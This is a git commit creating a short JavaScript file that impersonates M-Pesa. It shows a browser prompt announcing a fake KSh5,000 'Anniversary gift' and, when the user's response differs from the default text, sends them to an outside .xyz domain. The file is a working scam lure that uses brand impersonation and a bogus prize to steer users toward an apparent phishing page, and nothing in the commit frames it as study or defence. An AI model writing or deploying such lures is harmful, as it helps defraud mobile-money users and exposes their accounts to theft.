6ca8898f5e9364339dfecf200f2d62f40d40051e
bigetijazz22 <bigetijazz22@gmail.com>
2025-08-09 03:38:26 +0100

    Create kenympesa.js

---
+++ kenympesa.js
@@ -0,0 +1,6 @@
+
+var password = 'Withdraw KSh5,000'
+password=prompt('Mpesa: Congratulations, your Mpesa account has qualified to receive the KSh5,000 Mpesa Anniversary gift, Please Click OK TO CONTINUE','Withdraw KSh5,000');
+if (password != 'Withdraw KSh5,000') {
+location.href='https://www.chadoffrez.xyz/Withdraw-mpesa-KSh5000';
+}
